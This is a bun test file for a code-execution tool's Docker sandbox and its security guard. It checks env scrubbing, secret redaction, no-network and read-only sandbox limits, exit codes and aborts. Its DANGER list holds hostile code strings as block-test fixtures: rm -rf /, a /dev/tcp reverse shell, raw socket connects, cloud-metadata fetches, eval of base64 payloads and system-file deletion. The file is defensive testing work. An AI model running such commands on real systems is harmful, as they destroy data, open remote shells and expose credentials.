// EXHAUSTIVE corner-case tests for the execute_code tool (Docker sandbox).
// Real scanCode/scrubEnv (lib), real tool execute() against real python3/node children
// and a real Docker sandbox. Docker IS available in this environment (python:3.12-slim, node:20-slim).
//
// Run:
//   cd /Users/user/GitHub/FABULA-LLM-5/plugin && \
//   PATH=/usr/local/bin:$PATH /Users/user/.bun/bin/bun test __tests__/corner-execute-code.test.ts
//
// Categories covered: python+node happy paths; Docker sandbox default (+sandbox note +metadata);
// no-network in sandbox; read-only fs in sandbox; catastrophic/exfil REFUSED by scanCode (no exec);
// benign subprocess allowed; env-scrub on local path (hides secret-shaped vars, keeps PATH);
// secret printed by code redacted; exit codes; empty code; syntax error; large stdout cap;
// unicode/emoji/CRLF output; sandbox:false forces local; FABULA_CODE_SANDBOX=0 forces local;
// extra/unknown args; language aliasing; concurrency; abort/timeout (quick).

import { test, expect, beforeAll, afterAll } from "bun:test"
import { execFileSync } from "node:child_process"
import * as os from "node:os"
import * as fs from "node:fs/promises"
import * as path from "node:path"
import { FabulaTools } from "../fabula-tools"
import { scanCode, scrubEnv } from "../lib/codeguard"

let T: any
const baseCtx = () => ({ sessionID: "corner-exec", directory: os.tmpdir(), abort: new AbortController().signal } as any)
const out = (r: any) => (typeof r === "string" ? r : r.output)
const meta = (r: any) => (typeof r === "string" ? undefined : r.metadata)

beforeAll(async () => { T = (await FabulaTools({} as any)).tool })

// ── env hygiene: ensure FABULA_CODE_SANDBOX is not lingering between tests ──
const SAVED_SANDBOX = process.env.FABULA_CODE_SANDBOX
afterAll(() => {
  if (SAVED_SANDBOX === undefined) delete process.env.FABULA_CODE_SANDBOX
  else process.env.FABULA_CODE_SANDBOX = SAVED_SANDBOX
})

const dockerUp = (() => {
  try {
    execFileSync("docker", ["version", "--format", "{{.Server.Version}}"], { stdio: ["ignore", "pipe", "ignore"] })
    return true
  } catch { return false }
})()

// unique temp dir helper
let _ctr = 0
async function mkTmp(): Promise<string> {
  const d = path.join(os.tmpdir(), `fabula-exec-corner-${process.pid}-${_ctr++}`)
  await fs.mkdir(d, { recursive: true })
  return d
}

// ── transient Docker spin-up failure → bounded retry (Docker-path tests only) ──
// Under full-suite CPU contention, `docker run` occasionally fails BEFORE the user code
// runs: spawn error (tool resolves the plain string "execute_code docker error: …"),
// a daemon/runtime startup error (daemon stderr in output, docker CLI exit 125/126/127),
// or container spin-up exceeding the tool's 60s kill. None of these results can satisfy
// any assertion below, so retrying on exactly these signatures does not weaken what the
// tests verify — a persistent failure still surfaces through the unchanged assertions.
function transientDockerFailure(r: any): boolean {
  if (typeof r === "string") return r.startsWith("execute_code docker error:")
  const text = out(r) ?? ""
  const code = meta(r)?.exitCode
  return (
    code === 125 || code === 126 || code === 127 || // docker CLI/daemon failure, not user code
    /error response from daemon|cannot connect to the docker daemon|oci runtime|error during container init/i.test(text) ||
    text.includes("[killed: timeout 60s or aborted]")
  )
}

async function execSandboxed(args: any): Promise<any> {
  let r = await T.execute_code.execute(args, baseCtx())
  for (let attempt = 1; attempt <= 2 && transientDockerFailure(r); attempt++) {
    console.warn(`[corner-execute-code] transient docker failure, retry ${attempt}/2:`, String(out(r)).slice(0, 200))
    await new Promise((res) => setTimeout(res, 1500 * attempt))
    r = await T.execute_code.execute(args, baseCtx())
  }
  return r
}

// ════════════════════════════════════════════════════════════════════
// 1. LOCAL (sandbox:false) happy paths — python + node
// ════════════════════════════════════════════════════════════════════
test("local python happy path (sandbox:false)", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "print(6*7)", sandbox: false }, baseCtx())
  expect(out(r)).toContain("42")
  expect(meta(r)?.sandboxed).toBe(false)
  expect(meta(r)?.exitCode).toBe(0)
  expect(meta(r)?.language).toBe("python")
  expect(out(r)).toContain("local exec")
}, 30000)

test("local node happy path (sandbox:false)", async () => {
  const r = await T.execute_code.execute({ language: "node", code: "console.log(40+2)", sandbox: false }, baseCtx())
  expect(out(r)).toContain("42")
  expect(meta(r)?.sandboxed).toBe(false)
  expect(meta(r)?.language).toBe("node")
}, 30000)

// language aliasing: js / javascript → node, anything else → python
test("language aliasing js/javascript→node, unknown→python", async () => {
  const a = await T.execute_code.execute({ language: "js", code: "console.log('JSOK')", sandbox: false }, baseCtx())
  expect(meta(a)?.language).toBe("node")
  expect(out(a)).toContain("JSOK")
  const b = await T.execute_code.execute({ language: "JavaScript", code: "console.log('JS2')", sandbox: false }, baseCtx())
  expect(meta(b)?.language).toBe("node")
  // unknown language string falls through to python
  const c = await T.execute_code.execute({ language: "ruby", code: "print('PYFALLBACK')", sandbox: false }, baseCtx())
  expect(meta(c)?.language).toBe("python")
  expect(out(c)).toContain("PYFALLBACK")
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 2. EXIT CODES — non-zero
// ════════════════════════════════════════════════════════════════════
test("non-zero exit code (python sys.exit(3)) is reported", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "import sys; sys.exit(3)", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).toBe(3)
  expect(meta(r)?.sandboxed).toBe(false)
}, 30000)

test("node process.exit(7) is reported", async () => {
  const r = await T.execute_code.execute({ language: "node", code: "process.exit(7)", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).toBe(7)
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 3. SYNTAX / RUNTIME ERROR — stderr captured, non-zero exit
// ════════════════════════════════════════════════════════════════════
test("python syntax error → stderr captured, exit != 0", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "def (:\n  pass", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).not.toBe(0)
  expect(out(r).toLowerCase()).toContain("syntaxerror")
  expect(out(r)).toContain("[stderr]")
}, 30000)

test("python runtime exception → traceback in stderr", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "raise ValueError('boom-xyz')", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).not.toBe(0)
  expect(out(r)).toContain("boom-xyz")
  expect(out(r).toLowerCase()).toContain("valueerror")
}, 30000)

test("node throw → stderr captured", async () => {
  const r = await T.execute_code.execute({ language: "node", code: "throw new Error('node-boom-42')", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).not.toBe(0)
  expect(out(r)).toContain("node-boom-42")
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 4. EMPTY CODE
// ════════════════════════════════════════════════════════════════════
test("empty code string runs cleanly (no output, exit 0)", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).toBe(0)
  expect(out(r)).toContain("(no output)")
}, 30000)

test("whitespace-only code runs cleanly", async () => {
  const r = await T.execute_code.execute({ language: "node", code: "   \n  \t ", sandbox: false }, baseCtx())
  expect(meta(r)?.exitCode).toBe(0)
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 5. LARGE STDOUT — capped at 100_000
// ════════════════════════════════════════════════════════════════════
test("large stdout is capped (~100k) and does not blow up", async () => {
  // print 5MB worth of 'A' — capture must be bounded
  const code = "import sys\nsys.stdout.write('A'*5_000_000)\nsys.stdout.flush()"
  const r = await T.execute_code.execute({ language: "python", code, sandbox: false }, baseCtx())
  const text = out(r)
  // body is capped near 100k + small redact/suffix overhead — assert it's far below the 5MB produced
  expect(text.length).toBeLessThan(300_000)
  expect(text.length).toBeGreaterThan(50_000)
  expect(meta(r)?.sandboxed).toBe(false)
}, 60000)

// ════════════════════════════════════════════════════════════════════
// 6. UNICODE / EMOJI / CRLF OUTPUT
// ════════════════════════════════════════════════════════════════════
test("unicode + emoji output preserved (python)", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "print('héllo — Ω 日本語 🚀✅')", sandbox: false }, baseCtx())
  expect(out(r)).toContain("héllo")
  expect(out(r)).toContain("日本語")
  expect(out(r)).toContain("🚀")
}, 30000)

test("CRLF / special chars in output preserved (node)", async () => {
  const r = await T.execute_code.execute({ language: "node", code: "process.stdout.write('a\\r\\nb\\tc\\\\d')", sandbox: false }, baseCtx())
  expect(out(r)).toContain("a")
  expect(out(r)).toContain("b")
  expect(out(r)).toContain("c")
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 7. ENV-SCRUB on the local path (real child env)
// ════════════════════════════════════════════════════════════════════
test("env-scrub: secret-shaped vars hidden from local child, PATH kept", async () => {
  process.env.FAKE_API_KEY = "super-secret-leak-AAA"
  process.env.MY_SVC_TOKEN = "tok-leak-BBB"
  process.env.DB_PASSWORD = "pw-leak-CCC"
  process.env.HARMLESS_FLAG = "keep-me-DDD"
  try {
    const code = [
      "import os",
      "for k in ['FAKE_API_KEY','MY_SVC_TOKEN','DB_PASSWORD','HARMLESS_FLAG']:",
      "    print(k+'='+os.environ.get(k,'NONE'))",
      "print('PATH_PRESENT='+('yes' if os.environ.get('PATH') else 'no'))",
    ].join("\n")
    const r = await T.execute_code.execute({ language: "python", code, sandbox: false }, baseCtx())
    const text = out(r)
    expect(text).toContain("FAKE_API_KEY=NONE")
    expect(text).toContain("MY_SVC_TOKEN=NONE")
    expect(text).toContain("DB_PASSWORD=NONE")
    expect(text).toContain("HARMLESS_FLAG=keep-me-DDD") // non-secret var passes through
    expect(text).toContain("PATH_PRESENT=yes")          // PATH kept so interpreter resolves
    expect(text).not.toContain("super-secret-leak-AAA")
    expect(text).not.toContain("tok-leak-BBB")
  } finally {
    delete process.env.FAKE_API_KEY; delete process.env.MY_SVC_TOKEN
    delete process.env.DB_PASSWORD; delete process.env.HARMLESS_FLAG
  }
}, 30000)

// pure-fn cross check on scrubEnv (defense-in-depth boundaries)
test("scrubEnv keeps PATH/HOME, drops *_KEY/*_TOKEN/PASSWORD/provider vars", () => {
  const e = scrubEnv({
    PATH: "/usr/bin", HOME: "/h", LANG: "en", NODE_ENV: "prod", PYTHONPATH: "/p", VIRTUAL_ENV: "/v",
    FAKE_API_KEY: "x", SOME_TOKEN: "y", APP_SECRET: "z", DBPASSWORD: "p",
    EXAMPLE_API_KEY: "a", OPENAI_API_KEY: "o", AWS_SECRET_ACCESS_KEY: "w", GITHUB_TOKEN: "g",
    NVIDIA_API_KEY: "n", ZHIPU_API_KEY: "zk", HF_TOKEN: "h", SLACK_BOT: "s",
    // NOTE: a genuinely non-secret name. Do NOT use a name containing the substring
    // "_SECRET"/"_KEY"/"_TOKEN" — SECRET_ENV is intentionally aggressive and would (correctly) drop it.
    PLAIN_FLAG: "keep", undefinedVal: undefined as any,
  })
  expect(e.PATH).toBe("/usr/bin")
  expect(e.HOME).toBe("/h")
  expect(e.NODE_ENV).toBe("prod")
  expect(e.PYTHONPATH).toBe("/p")
  expect(e.VIRTUAL_ENV).toBe("/v")
  expect(e.PLAIN_FLAG).toBe("keep")
  for (const k of ["FAKE_API_KEY","SOME_TOKEN","APP_SECRET","DBPASSWORD","EXAMPLE_API_KEY",
                   "OPENAI_API_KEY","AWS_SECRET_ACCESS_KEY","GITHUB_TOKEN","NVIDIA_API_KEY",
                   "ZHIPU_API_KEY","HF_TOKEN","SLACK_BOT"]) {
    expect(e[k]).toBeUndefined()
  }
  expect(e.undefinedVal).toBeUndefined()
})

// ════════════════════════════════════════════════════════════════════
// 8. SECRET PRINTED BY CODE → redacted in output
// ════════════════════════════════════════════════════════════════════
test("secret printed by code is redacted (sk-ant key shape)", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "print('key sk-ant-abcdef0123456789ABCDEF01 end')", sandbox: false }, baseCtx())
  expect(out(r)).toContain("[REDACTED:SK_ANT_KEY]")
  expect(out(r)).not.toContain("sk-ant-abcdef0123456789ABCDEF01")
}, 30000)

test("secret printed by code is redacted (nvidia + JWT shapes)", async () => {
  const code = "print('nvapi-ABCDEFGHIJKLMNOPQRSTUVWX01234567')\n" +
    "print('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QTabcdef')"
  const r = await T.execute_code.execute({ language: "node",
    code: `console.log('nvapi-ABCDEFGHIJKLMNOPQRSTUVWX01234567'); console.log('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QTabcdef')`,
    sandbox: false }, baseCtx())
  expect(out(r)).toContain("[REDACTED:NVIDIA_KEY]")
  expect(out(r)).toContain("[REDACTED:JWT]")
  expect(out(r)).not.toContain("nvapi-ABCDEFGHIJKLMNOPQRSTUVWX01234567")
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 9. CATASTROPHIC / EXFIL CODE — REFUSED by scanCode, NO execution
//    (verified: output is the [BLOCKED ...] sentinel, no metadata, no side effects)
// ════════════════════════════════════════════════════════════════════
const DANGER: Array<[string, string, string, string]> = [
  ["os.system rm -rf /",          "python", "import os; os.system('rm -rf /')",                          "embedded_rm_rf_root"],
  ["os.system rm -rf ~",          "python", "import os\nos.system('rm -rf ~')",                          "embedded_rm_rf_root"],
  ["reverse shell /dev/tcp",      "python", "import os\nos.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')", "devtcp"],
  ["raw socket reverse shell",    "python", "import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('1.2.3.4',4444))", "raw_socket"],
  ["cloud metadata IP",           "python", "import urllib.request\nurllib.request.urlopen('http://169.254.169.254/latest/meta-data/')", "cloud_metadata"],
  ["GCP metadata host",           "python", "import urllib.request\nurllib.request.urlopen('http://metadata.google.internal/')", "cloud_metadata"],
  ["eval(base64decode)",          "python", "import base64\neval(base64.b64decode('cHJpbnQoMSk='))",     "eval_decoded"],
  ["exec(b64decode)",             "python", "exec(b64decode(payload))",                                  "eval_decoded"],
  ["os.unlink /etc/passwd",       "python", "import os\nos.unlink('/etc/passwd')",                       "delete_system"],
  ["fs.unlinkSync /etc/hosts",    "node",   "const fs=require('fs'); fs.unlinkSync('/etc/hosts')",       "delete_system"],
  ["obfuscated __import__ os.system","python","__import__('os').system('id')",                           "obfuscated_os_system"],
  ["shutil.rmtree('/')",          "python", "import shutil\nshutil.rmtree('/')",                         "rmtree_root"],
]
for (const [name, lang, code, expectCode] of DANGER) {
  test(`REFUSED (no exec): ${name}`, async () => {
    const r = await T.execute_code.execute({ language: lang, code }, baseCtx())
    const text = out(r)
    expect(text).toContain("[BLOCKED by FABULA security")
    expect(text).toContain(`code:${expectCode}`)
    // refused → returns a plain string, never a metadata-bearing exec result
    expect(typeof r).toBe("string")
    expect(meta(r)).toBeUndefined()
  }, 20000)
}

// pure-fn cross check: scanCode flags these regardless of sandbox/Docker
test("scanCode pure-fn: all DANGER cases blocked with expected code", () => {
  for (const [name, lang, code, expectCode] of DANGER) {
    const v = scanCode(lang, code)
    expect(v.blocked).toBe(true)
    expect(v.code).toBe(expectCode)
  }
})

// scanCode must NOT block benign code (false-positive guard)
test("scanCode allows benign subprocess / child_process (echo)", () => {
  expect(scanCode("python", "import subprocess; subprocess.run(['echo','hi'])").blocked).toBe(false)
  expect(scanCode("node", "const cp=require('child_process'); cp.execSync('echo hi')").blocked).toBe(false)
  expect(scanCode("python", "import shutil; shutil.rmtree('/tmp/scratch')").blocked).toBe(false)
  expect(scanCode("python", "print(sum(range(10)))").blocked).toBe(false)
})

// benign subprocess is allowed AND executes on the LOCAL path (real child)
test("benign subprocess executes (local) and returns output", async () => {
  const r = await T.execute_code.execute({ language: "python",
    code: "import subprocess\nprint(subprocess.run(['echo','SUBPROC_OK'],capture_output=True,text=True).stdout.strip())",
    sandbox: false }, baseCtx())
  expect(out(r)).toContain("SUBPROC_OK")
  expect(meta(r)?.exitCode).toBe(0)
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 10. EXTRA / UNKNOWN ARGS — tolerated (ignored), still runs
// ════════════════════════════════════════════════════════════════════
test("extra/unknown args are tolerated", async () => {
  const r = await T.execute_code.execute(
    { language: "python", code: "print('EXTRA_OK')", sandbox: false, timeout_ms: 99, foo: "bar", nested: { a: 1 } } as any,
    baseCtx(),
  )
  expect(out(r)).toContain("EXTRA_OK")
}, 30000)

test("sandbox:null behaves like default (not false) → wants sandbox", async () => {
  // sandbox is nullish-optional; null/undefined must NOT force-local. With docker up it sandboxes.
  const r = await execSandboxed({ language: "python", code: "print('NULLSANDBOX')", sandbox: null } as any)
  expect(out(r)).toContain("NULLSANDBOX")
  if (dockerUp) expect(meta(r)?.sandboxed).toBe(true)
}, 120000)

// ════════════════════════════════════════════════════════════════════
// 11. FABULA_CODE_SANDBOX=0 forces local even with docker up
// ════════════════════════════════════════════════════════════════════
test("FABULA_CODE_SANDBOX=0 forces LOCAL execution", async () => {
  process.env.FABULA_CODE_SANDBOX = "0"
  try {
    const r = await T.execute_code.execute({ language: "python", code: "print('FORCED_LOCAL')" }, baseCtx())
    expect(out(r)).toContain("FORCED_LOCAL")
    expect(meta(r)?.sandboxed).toBe(false)
    expect(out(r)).toContain("local exec")
  } finally { delete process.env.FABULA_CODE_SANDBOX }
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 12. ABORT — aborting the signal kills the local child quickly
// ════════════════════════════════════════════════════════════════════
test("abort signal kills a running local child (no 60s wait)", async () => {
  const ac = new AbortController()
  const ctx = { sessionID: "abort", directory: os.tmpdir(), abort: ac.signal } as any
  const p = T.execute_code.execute({ language: "python", code: "import time\nfor i in range(600): time.sleep(0.1)\nprint('SHOULD_NOT_FINISH')", sandbox: false }, ctx)
  setTimeout(() => ac.abort(), 800)
  const r = await p
  expect(out(r)).not.toContain("SHOULD_NOT_FINISH")
  expect(out(r)).toContain("[killed: timeout 60s or aborted]")
}, 30000)

// ════════════════════════════════════════════════════════════════════
// 13. CONCURRENCY — multiple local executions in parallel don't cross-talk
// ════════════════════════════════════════════════════════════════════
test("concurrent local executions stay isolated", async () => {
  const jobs = Array.from({ length: 6 }, (_, i) =>
    T.execute_code.execute({ language: "python", code: `print(${i}*${i})`, sandbox: false }, baseCtx()),
  )
  const rs = await Promise.all(jobs)
  for (let i = 0; i < 6; i++) {
    expect(out(rs[i])).toContain(String(i * i))
    expect(meta(rs[i])?.exitCode).toBe(0)
  }
}, 60000)

// ════════════════════════════════════════════════════════════════════
// 14. DOCKER SANDBOX (live) — default-on, sandbox note, metadata.sandboxed
// ════════════════════════════════════════════════════════════════════
test.if(dockerUp)("Docker sandbox is the DEFAULT (sandboxed=true + note)", async () => {
  const r = await execSandboxed({ language: "python", code: "print(2+2)" })
  expect(out(r)).toContain("4")
  expect(out(r)).toContain("[sandboxed: docker")
  expect(out(r)).toContain("--network none")
  expect(meta(r)?.sandboxed).toBe(true)
  expect(meta(r)?.exitCode).toBe(0)
}, 180000)

test.if(dockerUp)("Docker sandbox runs node by default too", async () => {
  const r = await execSandboxed({ language: "node", code: "console.log(21*2)" })
  expect(out(r)).toContain("42")
  expect(meta(r)?.sandboxed).toBe(true)
}, 180000)

// NO NETWORK in sandbox — python urllib + node fetch both blocked
test.if(dockerUp)("Docker sandbox: python urllib has NO network (exfil blocked)", async () => {
  const code = [
    "import urllib.request as u",
    "try:",
    "    u.urlopen('http://example.com', timeout=8); print('NET_OK')",
    "except Exception:",
    "    print('NET_BLOCKED')",
  ].join("\n")
  const r = await execSandboxed({ language: "python", code })
  expect(out(r)).toContain("NET_BLOCKED")
  expect(out(r)).not.toContain("NET_OK")
}, 180000)

test.if(dockerUp)("Docker sandbox: node fetch has NO network", async () => {
  const code = "fetch('http://example.com',{signal:AbortSignal.timeout(8000)})" +
    ".then(()=>console.log('NET_OK')).catch(()=>console.log('NET_BLOCKED'))"
  const r = await execSandboxed({ language: "node", code })
  expect(out(r)).toContain("NET_BLOCKED")
  expect(out(r)).not.toContain("NET_OK")
}, 180000)

// READ-ONLY fs in sandbox — writing outside /tmp fails, /tmp tmpfs works
test.if(dockerUp)("Docker sandbox: root fs is READ-ONLY (write outside /tmp fails)", async () => {
  const code = [
    "try:",
    "    open('/evil.txt','w').write('x'); print('WROTE_ROOT')",
    "except Exception as e:",
    "    print('RO_BLOCKED:'+type(e).__name__)",
  ].join("\n")
  const r = await execSandboxed({ language: "python", code })
  expect(out(r)).toContain("RO_BLOCKED")
  expect(out(r)).not.toContain("WROTE_ROOT")
}, 180000)

test.if(dockerUp)("Docker sandbox: /work code mount is read-only (cannot tamper)", async () => {
  const code = [
    "try:",
    "    open('/work/c.py','a').write('# tamper'); print('TAMPERED')",
    "except Exception:",
    "    print('WORK_RO')",
  ].join("\n")
  const r = await execSandboxed({ language: "python", code })
  expect(out(r)).toContain("WORK_RO")
  expect(out(r)).not.toContain("TAMPERED")
}, 180000)

test.if(dockerUp)("Docker sandbox: /tmp tmpfs IS writable (scratch space works)", async () => {
  const code = "open('/tmp/ok.txt','w').write('hi'); print('TMP_OK:'+open('/tmp/ok.txt').read())"
  const r = await execSandboxed({ language: "python", code })
  expect(out(r)).toContain("TMP_OK:hi")
}, 180000)

// sandbox metadata exit code in Docker for a failing program
test.if(dockerUp)("Docker sandbox: non-zero exit code surfaced", async () => {
  const r = await execSandboxed({ language: "python", code: "import sys; sys.exit(5)" })
  expect(meta(r)?.sandboxed).toBe(true)
  expect(meta(r)?.exitCode).toBe(5)
}, 180000)

// secret printed inside the sandbox is still redacted in the returned output
test.if(dockerUp)("Docker sandbox: printed secret is redacted in output", async () => {
  const r = await execSandboxed({ language: "python", code: "print('tok sk-ant-abcdef0123456789ABCDEF01 x')" })
  expect(out(r)).toContain("[REDACTED:SK_ANT_KEY]")
  expect(out(r)).not.toContain("sk-ant-abcdef0123456789ABCDEF01")
}, 180000)

// sandbox:false forces LOCAL even when docker is available (sandboxed=false)
test.if(dockerUp)("sandbox:false forces LOCAL even with Docker up", async () => {
  const r = await T.execute_code.execute({ language: "python", code: "print('LOCAL_FORCED')", sandbox: false }, baseCtx())
  expect(out(r)).toContain("LOCAL_FORCED")
  expect(meta(r)?.sandboxed).toBe(false)
  expect(out(r)).not.toContain("[sandboxed: docker")
}, 30000)

// unicode/emoji survive the Docker round-trip
test.if(dockerUp)("Docker sandbox: unicode/emoji output preserved", async () => {
  const r = await execSandboxed({ language: "python", code: "print('Ω 日本語 🚀')" })
  expect(out(r)).toContain("日本語")
  expect(out(r)).toContain("🚀")
}, 180000)

// ════════════════════════════════════════════════════════════════════
// 15. ephemeral-container cleanup: no leftover host temp dir after a run
//     (the tool mkdtemp's under homedir with .fabula-sbx- prefix and rm's it)
// ════════════════════════════════════════════════════════════════════
test.if(dockerUp)("Docker sandbox cleans up its host temp dir", async () => {
  const home = os.homedir()
  const before = (await fs.readdir(home)).filter((n) => n.startsWith(".fabula-sbx-")).length
  await execSandboxed({ language: "python", code: "print('CLEANUP_CHECK')" })
  // give the async cleanup a beat
  await new Promise((res) => setTimeout(res, 500))
  const after = (await fs.readdir(home)).filter((n) => n.startsWith(".fabula-sbx-")).length
  expect(after).toBeLessThanOrEqual(before)
}, 180000)
